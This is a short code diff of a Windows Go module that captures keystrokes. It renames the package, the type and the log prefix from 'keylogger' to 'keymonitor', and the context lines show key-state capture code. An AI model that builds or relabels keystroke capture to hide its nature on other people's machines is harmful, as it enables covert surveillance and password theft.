@@ -2,7 +2,7 @@
 //go:build windows
 // +build windows
 
-package keylogger
+package keymonitor
 
 import (
 	"fmt"
@@ -55,7 +55,7 @@ var keyNames = map[int]string{
 	VK_MENU:    "[ALT]",
 }
 
-func (k *Keylogger) captureKeystrokes() error {
+func (k *Keymonitor) captureKeystrokes() error {
 	keyState := make(map[int]bool)
 
 	for {
@@ -95,7 +95,7 @@ func getKeyString(vk int) string {
 	var kbState [256]byte
 	ret, _, err := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&kbState[0])))
 	if ret == 0 {
-		log.Printf("[keylogger] GetKeyboardState failed: %v", err)
+		log.Printf("[keymonitor] GetKeyboardState failed: %v", err)
 		return ""
 	}
 
